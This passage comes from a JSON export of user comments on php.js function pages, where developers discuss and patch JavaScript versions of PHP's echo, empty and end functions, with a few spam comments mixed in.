createTextNode() converts HTML to text.  I still think that innerHTML() is better because it actually works (and it's fast).  Though it might not be practical for this project, you could use the innerDOM script from http:\/\/innerdom.sourceforge.net\/ to achieve the same effect as innerHTML() and adhere to &quot;standards.&quot;"},{"date":"2008-11-14 00:58:19","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Nate: I believe it would upset a lot of peope if we were to use innerHTML (considering &quot;echo is bad&quot;'s comments). innerDOM seems to be a solution, but we can't include it into php.js without changing php.js' nature. And to do that for only echo, would make inpracticle an understatement. We'll have to think some more on the innerDOM thing I guess: maybe we could ask it's author if we can just copy a portion of his code into this function directly. That would:\r\n- work\r\n- not change php.js' standalone-lyness\r\n- make echo a big function ;)\r\n\r\nThank you very much for sharing your thoughts and code on this with us. For now, I've at least  comitted your changes."},{"date":"2009-01-15 20:44:37","author":"der_simon","url":"http:\/\/simon-kuehn.de","comment":"Hi, \r\n\r\nim the author of the innerDOM-Script and I'm happy that anyone really cares about my few lines of code. I'm way out of the programming business, so I can only partly partitiate. \r\n\r\nWhat I couldn't see from my point is: Whould it help to contribiute the innerDOM-Script to your project or not? The php.js page says: \r\n\r\n\u00e2\u20ac\u0153There's no good place for a package like http:\/\/innerdom.sourceforge.net\/\u00e2\u20ac\u009d\r\n\r\nSo if it would be helpful I'm willing to contribute my code. \r\n\r\nRegard from Germany\r\n\r\nDer Simon"},{"date":"2009-01-15 23:18:43","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Since Kevin stated it might be possible to use innerDOM, I took it upon myself to check with Der Simon to see if we could release under MIT.\r\n\r\nAlthough it is still somewhat large for the average PHP-JS function, with a few superficial tweaks to the already terse code (such as removing a couple document.all blocks), and by just using one of his functions (the only one needed by echo), we can get something as relatively small as this:\r\n\r\n[CODE=&quot;Javascript&quot;]function stringToDOM(q){\r\n    var d=document;\r\n    function r(a){\r\n\treturn a.replace(\/\\r\/g,' ').replace(\/\\n\/g,' ');\r\n    }\r\n    function s(a){\r\n\treturn a.replace(\/&amp;amp;\/g,'&amp;').replace(\/&amp;gt;\/g,'&gt;').replace(\/&amp;lt;\/g,'&lt;').replace(\/&amp;nbsp;\/g,' ').replace(\/&amp;quot;\/g,'&quot;');\r\n    }\r\n    function t(a){\r\n\treturn a.replace(\/ \/g,'');\r\n    }\r\n    function u(a){\r\n\tvar b,c,e,f,g,h,i;\r\n\tb=d.createDocumentFragment();\r\n\tc=a.indexOf(' ');\r\n\tif(c===-1){\r\n\t    b.appendChild(d.createElement(a.toLowerCase()))\r\n\t}\r\n\telse{\r\n\t    i=t(a.substring(0,c)).toLowerCase();\r\n\t    a=a.substr(c+1);\r\n\t    b.appendChild(d.createElement(i));\r\n\t    while(a.length){\r\n\t\te=a.indexOf('=');\r\n\t\tif(e&gt;=0){\r\n\t\t    f=t(a.substring(0,e)).toLowerCase();\r\n\t\t    g=a.indexOf('&quot;');\r\n\t\t    a=a.substr(g+1);\r\n\t\t    g=a.indexOf('&quot;');\r\n\t\t    h=s(a.substring(0,g));\r\n\t\t    a=a.substr(g+2);\r\n\t\t    b.lastChild.setAttribute(f,h)\r\n\t      }else{\r\n\t\t  break\r\n\t      }\r\n\t  }\r\n      }\r\n      return b\r\n  }\r\n  function v(a,b,c){\r\n      var e,f;\r\n      e=b;\r\n      c=c.toLowerCase();\r\n      f=e.indexOf('&lt;\/'+c+'&gt;');\r\n      a=a.concat(e.substring(0,f));\r\n      e=e.substr(f);\r\n      while(a.indexOf('&lt;'+c)!=-1){\r\n\t  a=a.substr(a.indexOf('&lt;'+c));\r\n\t  a=a.substr(a.indexOf('&gt;')+1);\r\n\t  e=e.substr(e.indexOf('&gt;')+1);\r\n\t  f=e.indexOf('&lt;\/'+c+'&gt;');\r\n\t  a=a.concat(e.substring(0,f));\r\n\t  e=e.substr(f)\r\n      }\r\n      return b.length-e.length\r\n  }\r\n  function w(a){\r\n      var b,c,e,f,g,h,i,j,k,l,m,n,o,p,q;\r\n      b=d.createDocumentFragment();\r\n      while(a&amp;&amp;a.length){\r\n\t  c=a.indexOf('&lt;');\r\n\t  if(c===-1){\r\n\t      a=s(a);\r\n\t      b.appendChild(d.createTextNode(a));\r\n\t      a=null\r\n\t  }\r\n\t  else if(c){\r\n\t      q=s(a.substring(0,c));\r\n\t      b.appendChild(d.createTextNode(q));\r\n\t      a=a.substr(c)\r\n\t  }\r\n\t  else{\r\n\t      e=a.indexOf('&lt;!--');\r\n\t      if(!e){\r\n\t\t  f=a.indexOf('--&gt;');\r\n\t\t  g=a.substring(4,f);\r\n\t\t  g=s(g);\r\n\t\t  b.appendChild(d.createComment(g));\r\n\t\t  a=a.substr(f+3)\r\n\t      }\r\n\t      else{\r\n\t\t  h=a.indexOf('&gt;');\r\n\t\t  if(a.substring(h-1,h)==='\/'){\r\n\t\t      i=a.indexOf('\/&gt;');\r\n\t\t      j=a.substring(1,i);\r\n\t\t      b.appendChild(u(j));\r\n\t\t      a=a.substr(i+2)\r\n\t\t  }\r\n\t\t  else{\r\n\t\t      k=a.indexOf('&gt;');\r\n\t\t      l=a.substring(1,k);\r\n\t\t      m=d.createDocumentFragment();\r\n\t\t      m.appendChild(u(l));\r\n\t\t      a=a.substr(k+1);\r\n\t\t      n=a.substring(0,a.indexOf('&lt;\/'));\r\n\t\t      a=a.substr(a.indexOf('&lt;\/'));\r\n\t\t      if(n.indexOf('&lt;')!=-1){\r\n\t\t\t  o=m.lastChild.nodeName;\r\n\t\t\t  p=v(n,a,o);\r\n\t\t\t  n=n.concat(a.substring(0,p));\r\n\t\t\t  a=a.substr(p)\r\n\t\t      }\r\n\t\t      a=a.substr(a.indexOf('&gt;')+1);\r\n\t\t      m.lastChild.appendChild(w(n));\r\n\t\t      b.appendChild(m)\r\n\t\t  }\r\n\t      }\r\n\t  }\r\n      }\r\n      return b\r\n  }\r\n  return w(q)\r\n}[\/CODE]\r\n\r\nI suggest incorporating his useful and standards-compliant method (and also adding print() too), if you were still open to it... \r\n\r\n(Maybe it would be even more standards compliant if it checked for createElementNS support, but using the function in XUL still works ok for me)"},{"date":"2009-01-16 23:11:51","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ der_simon &amp; Brett Zamir: First of all, Der Simon Thank you so much for coming to us and offering your great code to our project. It seems we can put it to good use.\r\n\r\nMy main concern was that for such a little function, it would be a lot of code. There's no room in PHP.JS for global dependencies so it would really have to be duplicated inside the functions. So a really bloated echo would be the result.\r\n\r\nI'm okay with it now because:\r\n- Brett you did a great job trimming it down the the essentials that are important to us.\r\n- I have actually gotten some work done on the public compiler, which will enable people to optionally include echo in their package.\r\n\r\nNever ceases to amaze me. The simplest functions sometimes need the biggest chunks of code ;)\r\n\r\nAnyway, great effort both.\r\n\r\nPS. Can we alias print to echo?"},{"date":"2009-01-17 03:11:03","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"One important thing first...The line\r\n\r\n[CODE=&quot;Javascript&quot;]stringToDOM(arg);[\/CODE]\r\n\r\nneeds to be changed to:\r\n\r\n[CODE=&quot;Javascript&quot;]document.body.appendChild(stringToDOM(arg));[\/CODE]\r\n\r\nNow...print() would be the same with the following differences:\r\n\r\nThis line at the top:\r\n[CODE=&quot;Javascript&quot;]var arg = '', argc = arguments.length, argv = arguments, i = 0;[\/CODE]\r\n\r\ncan be entirely removed in print(). print() should also have &quot;arg&quot; added as an explicit function parameter (unless you want to merge the functions--see below).\r\n\r\nTo get the marginal speed difference with echo, you don't even need the line &quot;return null&quot; because functions always return undefined when not specified (which is probably a little closer to the PHP behavior if we get picky).\r\n\r\nThe for loop at the end can be replaced with the following shorter version if you are making an independent version for print():\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n    if (document.createDocumentFragment &amp;&amp; document.createTextNode &amp;&amp; document.appendChild) {\r\n        stringToDOM(arg);\r\n    } else if (document.write) {\r\n        document.write(arg);\r\n    }\r\n    return 1;\r\n[\/CODE]\r\n\r\nNote that if you did decide to have print() call echo() and just let its single argument cycle through the for loop one time, you'd have to still:\r\n1) avoid potential recursion by avoiding the print(arg) call (as I did above for a dedicated version of print())\r\n2) return 1 instead of not returning anything\r\n\r\nAlso, you can remove the notes to this function now (and for print()).\r\n\r\nBy the way, I realized that the stringToDOM() function can be stripped down a tiny bit more by changing substr() references to slice() (same behavior with one argument)--and substring() calls could be changed to slice() in cases where the 2nd argument would never be negative, though that would be harder to gauge without going through the code.\r\n\r\nAfter going through the stringToDOM() code a little more, besides the shortening just mentioned, I realized that a little bit more could be done, such as allow namespaces on elements and attributes when parsing to DOM. I'm not sure though when I may have time to get to it (have some deadlines now), but I hope to get to it eventually. \r\n\r\nIt would be cool if there could be some what we could specify where we wanted the echo to go (e.g., if we didn't want it in the body).  You know, I think we should be able to actually implement the PHP output buffer functions by configuring a parameter (as in the global php_js) which allowed the output from such functions to be captured and aggregated (until flushed\/cleaned) and then output later or assigned to a variable!\r\n\r\nAs an extended aside, another great thing about the stringToDOM() and DOMToString() functions is that they could be combined to make a standards-compliant version of the DOM level 3 Load-and-Save module for serialization and parsing (currently not supported in Firefox and probably other browsers). \r\n\r\nFor example, using the skeleton code within the source at https:\/\/bugzilla.mozilla.org\/attachment.cgi?id=333875 (for Mozilla bug https:\/\/bugzilla.mozilla.org\/show_bug.cgi?id=155749 ), they could be used within the code for LSSerializer.prototype.writeToString and LSParser.prototype.parse .\r\n\r\nThus you could parse in any browser in a compliant fashion with something like this:\r\n\r\n[CODE=&quot;Javascript&quot;]var lsInput = DOMImplementationLS.createLSInput().stringData = '&lt;myXml\/&gt;';\r\n\r\nvar doc = DOMImplementationLS.createLSParser(1, null).parse(lsInput);\r\n[\/CODE]\r\n\r\nand serialize in any browser with something like this:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nvar ser = DOMImplementationLS.createLSSerializer();\r\nvar str = ser.writeToString(document);[\/CODE]\r\n\r\nAdmittedly it might not be pretty, but it's standard (and can easily be wrapped as with the current Firefox and IE equivalents)."},{"date":"2009-01-17 03:14:38","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Sorry, if you did apply my changes for an independent version of print(), this should be changed to also apply the fix for stringToDOM():\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n    if (document.createDocumentFragment &amp;&amp; document.createTextNode &amp;&amp; document.appendChild) {\r\n        stringToDOM(arg);\r\n    }[\/CODE]\r\n\r\nto\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n    if (document.createDocumentFragment &amp;&amp; document.createTextNode &amp;&amp; document.appendChild) {\r\n        document.body.appendChild(stringToDOM(arg));\r\n    }[\/CODE]"},{"date":"2009-01-17 13:36:29","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"unfortunately, right now i cannot implement print as rhino already provides it. will have to change the testsuite later on.\r\n\r\nout buffering is a great idea. we should first make all functions that print something rely on echo,\r\nand have echo collect a buffer. i can see this working.\r\n\r\ndoes that really effect the speed, yes?\r\n\r\nnotes removed.\r\n\r\nI don't see yet where else we we should implement those dom functions. I have to say I don't work with that stuff on a daily basis."},{"date":"2009-01-18 03:28:54","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"As far as output buffering, I plan to shortly discuss my thoughts on how this, as with other issues, can be solved without too much pain for maintenance with a global instead, but if not, being dependent on echo would be fine by me.  \r\n\r\nBy the way, maybe the function could also test \r\n\r\nif (document.body) {\r\n    document.body.appendChild(stringToDOM(arg));\r\n}\r\nelse {\r\n    document.documentElement.appendChild(stringToDOM(arg));\r\n}\r\n\r\nto see if there IS a document.body, in case we are in an XML context (like XUL), and if not, append after the last element in the document.\r\n\r\nAs far as the speed, in my crude tests just now in JavaScript, there seems to be no difference in JavaScript between returning with null and not returning anything. But in PHP there is apparently a slight difference according to the FAQ linked from the PHP documentation: http:\/\/www.faqts.com\/knowledge_base\/view.phtml\/aid\/1\/fid\/40 , and the behavior of echo is not to return anything (while print returns 1), so I think there's no reason to return null specifically (takes a little more space in the already big function!) :)\r\n\r\nAs far as implementing the DOM functions, you're right, there is no place I know of, except serialize() if it handles DOM objects, and DOMDocument::saveXML, DOMDocument::loadXML . (speaking of the DOM in PHP (as in DOMDocument::validate), I'd LOVE to get XML validation in JS somehow).\r\n\r\nBut the note about the DOM functions was otherwise more just of an interesting aside (if you don't mind my overloading the comments here!)."},{"date":"2009-01-25 13:41:24","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Noted. I don't mind big comments. Relevant info should be here, and people should know how to use ctrl+f :)"},{"date":"2009-04-30 00:28:57","author":"Eugene Bulkin","url":"http:\/\/doubleaw.com","comment":"Lines 62 and 132 are missing semicolons after the bracket; as you are setting a var to a function, you must include them or when you pack the code it can trigger errors."},{"date":"2009-04-30 03:21:04","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"@Eugene, thanks for the catch! Fixed in SVN. (p.s. We're hoping to catch such issues automatically in the future with JSLint)"},{"date":"2009-05-29 05:18:31","author":"JB","url":"","comment":"Couldn't you just create a new node, innerHTML the code into it then move all of the children of the new node into body?"},{"date":"2009-05-30 10:22:22","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"JB, I adapted your idea as our last resort, since it may not work in an XML context. I also moved out the bulky code and added support for the common DOMParser or IE-specific parsing--for those who want full standards support, they can add the script referenced in the code to add DOM 3 Load and Save. The problem now though is that one must use the XHTML namespace since the script is giving a chance for the parsing to be done by DOMParser(), etc. for the sake of working with and in XML. We might make that code only execute if an ini is set, thus removing the need for a namespace."},{"date":"2010-05-13 16:04:57","author":"Cue","url":"","comment":"This throws an error in Firefox 3.6.3. Works fine in all other browsers.\n\n[CODE]stringToDOM(arg, d.body, ns_xhtml, \"div\").cloneNode is not a function[\/CODE]"},{"date":"2010-10-29 01:26:58","author":"EdorFaus","url":"","comment":"I think this code (lines 57-60) is not quite right:\n[code]\nif (!fc || !fc.documentElement ||\n  fc.documentElement.localName !== 'parsererror' ||\n  fc.documentElement.namespaceURI !== 'http:\/\/www.mozilla.org\/newlayout\/xml\/parsererror.xml') {\n  return fc.documentElement.firstChild;\n[\/code]\n\nConsidering what's in the block, and the last two tests, shouldn't the or-s be and-s, and the two first tests be reversed, to avoid returning undefined? Like this:\n[code]\nif (fc && fc.documentElement &&\n  fc.documentElement.localName !== 'parsererror' &&\n  fc.documentElement.namespaceURI !== 'http:\/\/www.mozilla.org\/newlayout\/xml\/parsererror.xml') {\n  return fc.documentElement.firstChild;\n[\/code]\n"},{"date":"2010-10-29 02:31:43","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@EdorFaus: Good catch (and bad mistake on my part, mitigated a bit by the catch thankfully). Fixed in Git (along with some JSLint\/coding standards fixes)."},{"date":"2010-12-25 13:19:41","author":"seingh","url":"","comment":"i think that echo() is only document.write() ..."},{"date":"2010-12-27 05:50:40","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@seingh: Yes, document.write() works all right (unless you are using XHTML served as application\/xhtml+xml), but this function attempts to offer normal DOM construction (assuming well-formed XHTML) which can work in either environment."}],"empty":[{"date":"2009-03-03 11:47:37","author":"Marc Jansen","url":"http:\/\/selectoid.wordpress.com","comment":"Nice work folks, but I think I found a bug:\r\n\r\nshouldn't the following code yield 'false'?\r\n[code]\r\nvar anObj = {\r\n   'aFunc' : function () { alert('humpty'); }\r\n};\r\nalert( empty(anObj) ) \/\/ alerts true, but the object contains an element\r\n[\/code]\r\n\r\n\/\/ is IMHO wrong for arrays as well:\r\n[code]\r\nvar anArr = [\r\n   function () { alert('humpty'); }\r\n];\r\nalert( empty(anArr) ) \/\/ alerts true, but the array contains an element\r\n[\/code]\r\n\r\nNamed functions should behave the same."},{"date":"2008-01-26 18:33:59","author":"IT","url":"","comment":"Awesome! Exactly what I needed ;)"},{"date":"2008-09-04 16:36:10","author":"Onno Marsman","url":"","comment":"should also return true on undefined"},{"date":"2008-09-05 21:36:24","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: Thanks again man! Remember if you have a homepage or something, I can add it to the credit sections."},{"date":"2008-10-06 16:39:14","author":"Onno Marsman","url":"","comment":"typeof array will be 'object' so the check for 'array' maxes no sense:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction empty( mixed_var ) {\r\n    if (mixed_var === &quot;&quot;\r\n        || mixed_var === 0\r\n        || mixed_var === &quot;0&quot;\r\n        || mixed_var === null\r\n        || mixed_var === false\r\n        || mixed_var === undefined\r\n        || (mixed_var instanceof Array &amp;&amp; mixed_var.length === 0)\r\n    ) {\r\n        return true;\r\n    }\r\n[\/CODE]\r\n\r\nSomething else: what about empty({}) ?\r\nIf you consider {} an object as in PHP then it will never be empty. But I would never use it like that. It would make more sense to call empty({}) when {} could be considered as an associative array, and in that case it is empty and should return true:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction empty( mixed_var ) {\r\n    if (mixed_var === &quot;&quot;\r\n        || mixed_var === 0\r\n        || mixed_var === &quot;0&quot;\r\n        || mixed_var === null\r\n        || mixed_var === false\r\n        || mixed_var === undefined\r\n    ){\r\n        return true;\r\n    }\r\n    if (typeof mixed_var == 'object') {\r\n        for (var i in mixed_var) {\r\n            return false;\r\n        }\r\n        return true;\r\n    }\r\n    return false;\r\n}\r\n[\/CODE]\r\nNote that in this implementation I removed the line that handles arrays because the section that takes care of objects handles this correctly for arrays anyway."},{"date":"2008-10-06 16:49:26","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: Excellent thought and well executed Onno!"},{"date":"2008-10-26 13:46:37","author":"Francesco","url":"www.integrasoftwae.it","comment":"If you extend the Array or Object prototype, empty([]) and empty({}) return true...\r\n\r\ni've added\r\nif (typeof mixed_var[key] !== 'function' )\r\nthis test before returning false in the for cicle, thanks"},{"date":"2008-11-03 10:27:16","author":"Brett Zamir","url":"","comment":"If you like, here's a little bit cleaner and slightly safer implementation, I think:\n\n[CODE]\nfunction create_function (args, code) {\n\t\/\/$newfunc = create_function('$a,$b', 'return $a + $b;');\n\t\/\/ alert($newfunc(5, 4)); \n\tvar argmnts = [];\t\n\targmnts = args.split(\/,\\s*\/);\t\n\treturn Function.apply(null, argmnts.concat(code));\n}\n[\/CODE]\n\nBut if one just wishes an anonymous function, they can just do:\n\n[CODE]call_user_func_array(function(arg) {...}, $a);[\/CODE]\n\nor if they need a string\n\n[CODE]call_user_func_array(new Function($arg1, $code), $a);[\/CODE]\n\nFor one behaving more like PHP in returning a global name for the new function:\n\n[CODE]\nfunction create_function (args, code) {\n\t\/\/ $newfunc = create_function('$a,$b', 'return $a + $b;');\n\t\/\/ alert($newfunc); \/\/ 'lambda_1'\n\t\/\/ alert(     window[$newfunc](5, 3)    ); \/\/ 8 (need window to call it, since the PHP behavior is to return a string)\n\n\tvar funcName = '';\n\tif (!this.php_js) {\n\t\tthis.php_js = {};\n\t}\n\tif (!this.php_js.create_function_ct) {\n\t\tthis.php_js.create_function_ct = 0;\n\t}\n\tthis.php_js.create_function_ct++;\t\n\tfuncName = 'lambda_'+this.php_js.create_function_ct;\n\n\teval(funcName+' = function (' + args + ') { ' +  code + '}');\n\n\treturn funcName;\n}\n[\/CODE]"},{"date":"2009-02-10 08:59:02","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"If it's all right, Kevin, I'll change the text for !== 'function' to be a test for whether o.hasOwnProperty(i). That solves the prototype problem (though even that might be considered non-empty) but avoids the current issue of considering this to be empty:  var o = {method:function(){}}"},{"date":"2009-02-11 02:39:23","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: wicked"},{"date":"2009-03-03 11:59:22","author":"Marc Jansen","url":"http:\/\/selectoid.wordpress.com","comment":"Nice work folks, but I think I found a bug: shouldn't the following code yield 'false'?\r\n\r\n[CODE=\"Javascript\"]\r\nvar anObj = { \r\n  'aFunc' : function () { alert('humpty'); } \r\n}; \r\nalert( empty( anObj ) ); \/\/ alerts true, but the object contains an element \r\n[\/CODE]\r\n\r\nThis is IMHO wrong for arrays as well:\r\n\r\n[CODE=\"Javascript\"]\r\nvar anArr = [ \r\n  function () { alert( 'dumpty' ); } \r\n]; \r\nalert( empty( anArr ) ) ; \/\/ alerts true, but the array contains an element\r\n[\/CODE]\r\n\r\nNamed functions should behave the same."},{"date":"2009-03-04 15:02:28","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Marc Jansen: Fixed in svn, thank you!"},{"date":"2009-04-09 09:12:47","author":"Knoxius","url":"http:\/\/knoxius.com\/","comment":"This version seems a bit complex for the mock-function. Couldn't it be simpler by doing something like this:\n\n[code]\nfunction empty(string) {\n\tif(string.length == 0) {\n\t\treturn true;\n\t} else {\n\t\treturn false;\n\t}\n}\n[\/code]\n\nIt seems a lot simpler, and it still works perfectly fine.\n\nExample:\n[code]\nvar myString = 'This is a string.';\n\nif(empty(null)) { \/\/Returns true\nalert(\"It is empty.\");\n} else if(empty(myString)) { \/\/Returns false\nalert(\"It is not empty.\");\n}\n[\/code]\n\nThere could be something about your code that is better, but it seems a bit too complex for what it could be."},{"date":"2009-04-13 07:23:21","author":"Brett Zamir","url":"","comment":"@Knoxius, PHP.JS is treating objects as associative arrays, including ones without a length property, so that wouldn't work for our project. We are also attempting to mimic PHP behavior fully for those familiar with PHP or wishing to use its approach. For example, your function would not consider any number to be non-empty, whereas PHP only considers 0 as such. Of course, your function might work just fine for your own purposes, but we're trying to build a reliable, consistent API, and PHP is the standard to go by (if we just made our own decisions at every turn, there wouldn't be much justification for sticking to PHP function names, as it'd probably just be more confusing for those who expected it to behave as in PHP)."},{"date":"2009-04-14 12:38:54","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Knoxius: Sometimes the most simple functions require the most insane JavaScript code. Seen echo ? ;)"},{"date":"2009-11-16 12:18:11","author":"Stoyan Kyosev","url":"http:\/\/www.svest.org","comment":"As noted in http:\/\/www.sitepoint.com\/blogs\/2009\/11\/12\/google-closure-how-not-to-write-javascript\/:\n\n\"This function checks if a particular variable has a value defined. Or it does, unless a 3rd party script sets the global undefined variable to something else. \"\n[CODE]\nvar undefined = 5; \n[\/CODE]\n\n\"u might think that anyone who assigns a value to undefined deserves what they get, but the fix in this case is trivial: simply declare a local undefined variable for use within the function!simply declare a local undefined variable for use within the function!\"\n\nfunction empty(val) { \n var undefined; \n return val !== undefined; \n}; \n\nI suggest to use this \"fix\" in the current implementation of 'empty'."},{"date":"2009-11-16 13:23:27","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Stoyan Kyosev: I committed a change at http:\/\/github.com\/kvz\/phpjs\/commit\/dd40b8850a29c0617a40c7ca5ed2ae90fd720a22 to use the \"typeof\" check, which doesn't suffer from the same problem (nor will it encourage bad practices for those who see our code and don't know why we're doing it).  However, I'm not really sure it is justified to do this for all our other functions which test for it since 1) It takes up a little more space, and 2) JavaScript has quite a few ways for you to redefine things (e.g., var isNaN = 5;). Any opinions? But it doesn't hurt, so there ya go... :) Thanks for the input..."},{"date":"2010-06-09 19:02:18","author":"dmitriy kulichkin","url":"","comment":"empty([]) will fail if we extend Array with some methods via prototype. I suppose we should check our keys do not to be function. Does it have a sense?"},{"date":"2010-06-19 16:28:00","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ dmitriy kulichkin: Could you maybe provide an example?"},{"date":"2010-06-21 04:54:23","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Kevin, I believe dmitriy means filtering via hasOwnProperty inside the for loop. I can make the change, but for this function I wonder whether some users might like to verify that the array\/object is _really_ empty (including of prototype-inherited properties). Thoughts? Maybe add an ini_set() configuration option to allow both cases?"},{"date":"2010-10-23 22:48:58","author":"Krinkle","url":"","comment":"The JSLint warning about for \"for in\" is quite correct.\nIf an array has prototypes it returns false (\"not empty\").\n\nTo fix this, one can simply check the .length to be 0 strictly.\n\n[CODE]\n\nfunction empty (v) {\n\tvar key;\n\tif (v === \"\" || v === 0 || v === \"0\" || v === null || v === false || typeof v === 'undefined') {\n\t\treturn true;\n\t}\n\tif (v.length === 0) {\n\t\treturn true;\n\t}\n\tif (typeof v === 'object') {\n\t\tfor (key in v) {\n\t\t\treturn false;\n\t\t}\n\t\treturn true;\n\t}\n\treturn false;\n}\n[\/CODE]"},{"date":"2011-07-04 21:25:24","author":"ProownCibbowl","url":"","comment":""},{"date":"2011-07-05 07:12:06","author":"bitPlaftwat","url":"http:\/\/topbrandszone.com\/","comment":""},{"date":"2011-08-02 04:14:40","author":"         l","url":"","comment":"lol"},{"date":"2011-09-07 13:15:23","author":"utenothence","url":"http:\/\/pharmacyworldrx.com\/","comment":""},{"date":"2011-10-07 12:42:50","author":"max4ever","url":"","comment":"I think checks for array should be added, it doesn't work with \n\n[code]\nvar my_ditta = new Array();\n\nmy_ditta['tasse'] = 1;\nmy_ditta['cartonaggio'] = 1;\n\nempty(my_ditta); \/\/=> gives true, but it's obviously false\n[\/code]"},{"date":"2011-10-07 23:58:19","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@max4ever: I don't know if you have any older version of the function or whether you were guessing that an array would not return \"object\" as a type (as it does in JavaScript even for arrays which are themselves objects), but in your example the empty() call returns true."},{"date":"2011-10-07 23:59:33","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@max4ever: Sorry, I mean it returns false--it indicates it is non-empty."},{"date":"2011-11-16 09:54:29","author":"Stephan","url":"","comment":"Hello,\n\nWhen testing a Date-Object, it always returns true: it's an object but has no keys.\n\nNo idea if this is the best solution. It works for me. I check if getMonth is available. Maybe there is a better way?\n\n[CODE]\nif (typeof mixed_var == 'object') {\n        for (key in mixed_var) {\n            return false;\n        }\n        if (mixed_var.getMonth)\n        {\n          return false;\n        }\n        return true;\n    }\n[\/CODE]"},{"date":"2011-11-19 15:50:39","author":"Sany-heem","url":"","comment":""},{"date":"2011-12-16 09:57:00","author":"Drug-Esota","url":"schemes-shop.com\/shop\/grundig_p37_060_service.html","comment":""},{"date":"2012-03-15 06:11:29","author":"carpinteyronyc","url":"","comment":""},{"date":"2012-03-19 18:53:25","author":"excemeexhaumP","url":"http:\/\/credit.sotatka.ru\/","comment":"+1"},{"date":"2012-04-04 13:18:33","author":"pletcherdgh","url":"","comment":""},{"date":"2012-05-22 09:02:51","author":"CasiariwarSic","url":"","comment":""},{"date":"2012-06-09 01:42:25","author":"CymnMda","url":"","comment":"buy azithro http:\/\/zithromaxs.com\/  zithromax stomach upset"},{"date":"2012-06-21 03:52:09","author":"pabrams","url":"","comment":"Hi, for the first two js lint issues, try some carriage returns.  Line #26 will also be much easier to read, especially if you format it nicely.  Each new line after [CODE]if (mixed_var === \"\"[\/CODE] could start with a constant number of tabs and then [CODE]|| mixed_var === [\/CODE].   How 'bout that?   Personally, I find code like line #26 to be inexcusable because it's a real pain to read, and very easy to avoid, if using a decent editor."},{"date":"2012-06-21 09:27:00","author":"Rafal","url":"","comment":"@pabrams: thanks. I've modified the function to make it more readable and got rid of most lint warnings. Updated code available on github (https:\/\/raw.github.com\/kvz\/phpjs\/master\/functions\/var\/empty.js)"},{"date":"2012-08-23 06:36:56","author":"mildevivy","url":"","comment":""},{"date":"2012-09-12 09:12:39","author":"David Lundgren","url":"","comment":"It would be nice to add the following otherwise date objects are always detected as being empty.\n\n[CODE]\n\tif (mixed_var instanceof Date) {\n\t\treturn isNaN(Number(mixed_var));\n\t}\n[\/CODE]\n\nIdea taken from http:\/\/frugalcoder.us\/post\/2010\/02\/15\/js-is-empty.aspx"},{"date":"2012-09-13 03:17:27","author":"wHrOxPsVfW","url":"","comment":""}],"end":[{"date":"2008-01-09 17:09:00","author":"Legaev Andrey","url":"","comment":"Did you mean &quot;return last_elm&quot; ?"},{"date":"2008-01-09 17:27:39","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Legaev Andrey: I sure did ;)"},{"date":"2008-06-15 04:15:18","author":"J A R","url":"","comment":"Doesn't .pop() return the last element from an array?\r\n[CODE=&quot;Javascript&quot;]\r\nfunction end ( array ) {\r\n    return array.pop();\r\n}\r\n[\/CODE]"},{"date":"2008-06-16 00:21:26","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ J A R: Much better, thank you!"},{"date":"2010-01-21 16:09:39","author":"Itsacon","url":"","comment":"The current version fails hard in Internet Explorer (both versions 7 and 8)\r\n\r\nindexOf() is a method of the String object, not of the Array object, so calling it on pointers (an Array()) isn't valid javascript code.\r\n\r\nI've reverted to the older version, which was less convoluted and worked fine:\r\n[code]function end(array)\r\n{\r\n\tvar last_elm,key;\r\n\tif(array.constructor==Array)\r\n\t{\r\n\t\tlast_elm=array[(array.length-1)];\r\n\t}\r\n\telse\r\n\t{\r\n\t\tfor(key in array)\r\n\t\t{\r\n\t\t\tlast_elm=array[key];\r\n\t\t}\r\n\t}\r\n\treturn last_elm;\r\n}[\/code]"},{"date":"2010-01-22 02:44:43","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Itsacon, Thanks...The fix had already been applied a while ago (indexOf is supported in Firefox, etc., so that was the reason for the mistake). Anyhow, you can see the current version if you click \"raw js source\". Btw, the reason for the rest of the \"convoluted\" code is to support tracking of the array \"pointer\" (as in PHP). end() moves the pointer to the end. We use the \"this.php_js\" global (or object property in the namespaced version) to hold this information. See next(), prev(), etc. for some other functions which keep track of the array's pointer.\n\n@Kevin, what will it take to get the site to update to reflect the latest git updates? It seems this fix was made a month ago...Thanks..."},{"date":"2010-01-22 